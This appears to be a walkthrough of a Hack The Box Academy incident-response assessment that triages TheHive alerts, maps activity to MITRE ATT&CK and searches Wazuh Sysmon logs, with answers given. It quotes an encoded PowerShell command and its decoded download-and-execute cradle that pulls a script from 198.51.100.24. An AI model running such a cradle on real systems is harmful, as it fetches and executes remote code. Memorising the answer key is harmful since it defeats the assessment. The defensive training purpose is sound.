┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ grep -E '92105' wazuh_export.json -A 25
        "id": "92105"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "3",
            "systemTime": "2025-10-09T08:09:51.102140Z",
            "providerName": "Microsoft-Windows-Sysmon/Operational"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\svchost.exe",
            "sourceIp": "172.16.200.50",
            "destinationIp": "172.16.10.20",
            "destinationPort": "445",
            "user": "svc_admin",
            "details": "SMB connect to \\\\fs01\\projects"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "3ce6f9af-1df1-40f8-843d-9365dbca1a29",
    "_source": {
      "agent": {

```

Answer: svc\_admin

***

### Skills Assesment

#### Triage the alerts

TheHive is loaded with alerts related to the Insights Nexus breach. You are requested to triage them, starting with:

* Task 1: Create a new case in TheHive. Find all the alerts that are specific to the Insights Nexus breach scenario, and link the alerts in the case. This exercise introduces you to work in TheHive alerts and cases.\

* Task 2: Perform triage, enrichment, and correlation in TheHive. In the notes of an alert, you can add useful information for enrichment.\

* Task 3: One of the alerts related to Insights Nexus in TheHive contains some information in the notes. The netstat command output shows some connectivity to external IP addresses. You can validate this finding.

![TheHive case interface showing a “Comments” panel with a pasted netstat -ano snippet from host 10.10.5.23. Entries include TCP 127.0.0.1:5357 LISTENING, TCP 10.10.5.23:139 LISTENING, outbound TCP 10.10.5.23:52344 → 198.5.x.x:443 ESTABLISHED, 10.10.5.23:52345 → 203.0.x.x:4444 ESTABLISHED, UDP 10.10.5.23:123 listening, and SMB connections to 10.10.5.17:445 and 10.10.5.18:445 (ESTABLISHED/TIME\_WAIT). Top bar shows controls (Create Case, language EN-UK, user HTB-ANALYST).](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ir-netstat.png)

This output was captured after the host machine rejoined the domain following recovery. However, it is still connecting to an IP address. The analyst added this in the comments of the alert.

There are some further questions asked at bottom of this section.

#### Mapping to the Cyber Kill Chain

A user opens an attachment, which executes a downloader that writes an .exe file to `%AppData%`, creates a `Run` registry key, and later loads `VaultCli.dll` via a suspicious tool, exfiltrating credentials to an external IP. Your task is to map each step of the attack to the kill chain phase.

* Task 1: Map the file download, registry, and exfiltration activity to MITRE ATT\&CK.
* Task 2: Check the alert related to Mimikatz in TheHive and identify the MITRE Technique ID.

#### Investigate the collected logs

* Task 1: Additionally, you are provided with some event log files (i.e., `logs-wazuh.zip`). One of the tasks is to decode some PowerShell commands and extract IOCs from them.
* Task 2: Identify the user who executed the suspicious PowerShell command.

Question: Open the alert "\[InsightNexus] Admin Login via ManageEngine Web Console." Find the foreign IP address starting with "203" in the comments. Check VirusTotal for the information related to this IP address, and add the details as a comment in this alert. In VirusTotal, what is the name of the file starting with "Mango" in the Files Referring section?

Answer: MangoJava.exe

Question: In VirusTotal, go to the details of the IP address starting with "198." What is the name of the city shown in the Whois Lookup?

Answer: [Los Angeles](https://www.virustotal.com/gui/search/entity%3Aip%20whois%3A%22Los%20Angeles%22)

Question: If malware downloads files from a C2 (Command and Control) server into the victim network, under what MITRE technique ID does this tool transfer technique fall? Type it as your answer. The format is T1\*\*\*.

Answer: T1105

Question:  Download the "logs-wazuh.zip" file from resources, and identify the suspicious PowerShell command in the logs. Type the suspicious IP address after decoding the command.

Method:&#x20;

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ grep "34012" logs-wazuh.json -A 20
        "id": "34012",
        "groups": [
          "windows",
          "sysmon",
          "execution",
          "obfuscation"
        ]
      },
      "data": {
        "win": {
          "system": {
            "eventID": "1",
            "systemTime": "2025-10-08T10:12:30.123Z",
            "providerName": "Microsoft-Windows-Sysmon"
          },
          "eventdata": {
            "ProcessGuid": "{e9b2a6d2-9f0c-4b3d-91a4-1f2d3e5a6b7c}",
            "ProcessId": "5420",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==",
            "ParentProcessId": "668",
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ 

```

Then use cyber chef to get the following:&#x20;

IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'

Answer: 198.51.100.24

Question: In the same file (i.e., logs-wazuh.zip), identify the user who executed the suspicious PowerShell command. The format is domain\user.

Answer: CORP\svc-update
